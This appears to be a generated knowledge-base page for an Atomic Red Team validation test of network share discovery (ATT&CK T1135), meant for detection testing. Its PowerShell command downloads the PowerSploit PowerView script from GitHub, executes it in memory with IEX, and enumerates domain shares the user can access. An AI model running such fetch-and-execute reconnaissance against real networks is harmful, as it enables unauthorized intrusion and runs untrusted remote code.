---
atomic_guid: "b1636f0a-ba82-435c-b699-0d78794d8bfd"
title: "Share Discovery with PowerView"
framework: "atomic"
generated: "true"
attack_technique_id: "T1135"
attack_technique_name: "Network Share Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1135/T1135.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "b1636f0a-ba82-435c-b699-0d78794d8bfd"
  - "Share Discovery with PowerView"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.

## ATT&CK Mapping

- [[kb/attack/techniques/T1135-network_share_discovery|T1135: Network Share Discovery]]

## Dependencies

Endpoint must be joined to domain

### Prerequisite Check

```powershell
if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
"Join system to domain"
```

## Executor

- name: powershell

### Command

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1135/T1135.yaml)
